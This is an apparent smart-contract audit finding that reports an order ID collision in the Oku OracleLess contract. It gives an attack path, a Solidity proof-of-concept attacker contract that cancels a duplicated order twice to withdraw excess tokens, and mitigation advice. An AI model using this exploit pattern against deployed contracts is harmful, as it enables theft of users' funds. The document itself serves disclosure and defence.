# Possible order overwrite due to order ID collision

### Summary

The algorithm for generating order IDs is flawed, as it uses `block.timestamp`, allowing duplicate IDs to be generated. This might result in orders being overwritten, in cases where the ID is being used as the key into a mapping, and consequently withdrawing more tokens than intended.

### Root Cause

[The hash algorithm](https://github.com/sherlock-audit/2024-11-oku/blob/main/oku-custom-order-types/contracts/automatedTrigger/AutomationMaster.sol#L90) uses a combination of `sender` address and `block.timestamp`. In some cases, for example [creating an order](https://github.com/sherlock-audit/2024-11-oku/blob/main/oku-custom-order-types/contracts/automatedTrigger/OracleLess.sol#L38), the `sender` parameter is user controlled, allowing duplicate IDs to be generated. 

If 2 orders are created with the same order ID, the first one will be overwritten by the other in the `orders` mapping, but the ID will be duplicated in `pendingOrderIds`.

### Internal pre-conditions

1. Two orders have to be created with the same order ID

### External pre-conditions

N/A

### Attack Path

1. Attacker calls [`createOrder`](https://github.com/sherlock-audit/2024-11-oku/blob/main/oku-custom-order-types/contracts/automatedTrigger/OracleLess.sol#L38) twice, generating the same order ID; the first order can be created with less tokens than the second one.
2. Attacker calls other functions that interact with the orders. One of the most impactful is [`cancelOrder`](https://github.com/sherlock-audit/2024-11-oku/blob/main/oku-custom-order-types/contracts/automatedTrigger/OracleLess.sol#L74). When called twice, the attacker will receive twice the amount sent in the second order, instead of the sum between the first order and the second.

### Impact

Attacker withdraws more tokens than intended, potentially draining the contract.

### PoC

The `OracleLess` contract used in the exploit is a minimal version of the real one. At the end of the `attack` function, the attacker contract will receive `100 + 100` tokens back, instead of `10 + 100`.

import { OracleLess } from "./OracleLess.sol";

contract Attacker {
    OracleLess oracleLess;

    constructor(address oracleLessAddress) {
        oracleLess = OracleLess(oracleLessAddress);
    }

    function attack() external {
        uint96 order1Id = oracleLess.createOrder(10, address(this));
        uint96 order2Id = oracleLess.createOrder(100, address(this));
        require(order1Id == order2Id, "order id mismatch");

        oracleLess.cancelOrder(order1Id);
        oracleLess.cancelOrder(order1Id);
    }
}
```

### Mitigation

1. Do not rely on `block.timestamp` to generate unique order IDs.
2. Either check for duplicate IDs, or reconsider the flow of keeping track of orders.
